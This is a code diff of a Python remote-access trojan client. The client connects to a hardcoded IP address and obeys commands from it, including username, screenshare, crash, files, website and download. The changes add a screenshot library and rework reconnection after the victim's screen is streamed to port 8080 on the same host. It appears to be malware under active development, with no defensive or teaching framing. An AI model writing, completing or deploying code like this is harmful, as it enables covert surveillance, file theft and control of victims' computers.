@@ -7,6 +7,7 @@ import threading
 import time
 import webbrowser
 import sys
+import pyautogui
 
 
 ip = "77.250.137.62"
@@ -26,7 +27,7 @@ def main():
         try:
             sockk = connnnect()
             while keepgoing == True:
-                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                #sockk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                 msg = recv(sockk)
                 if msg == "exit":
                     exit()
@@ -34,6 +35,7 @@ def main():
                     username(sockk)
                 elif msg == "screenshare":
                     screenshare(sockk)
+                    sockk = connnnect()
                 elif msg == "website":
                     website(sockk)
                 elif msg == "crash":
@@ -50,6 +52,8 @@ def main():
                     files(sockk)
                 elif msg == "download":
                     download(sockk)
+                #elif msg == "screenshot":
+                    #screenshot(sockk)
 
         except Exception as err:
             print(Exception, err)
@@ -93,15 +97,15 @@ def username(sock):
 
 
 def screenshare(sock):
+    #time = sock.recv(1024)
     sock.close()
     sender = ScreenShareClient("77.250.137.62", 8080)
     t = threading.Thread(target=sender.start_stream)
     t.start()
     time.sleep(15)
     sender.stop_stream()
-    sourcefile = os.getcwd() + "\\client.py"
-    os.system(sourcefile)
-    sys.exit()
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    return sock
 
 
 
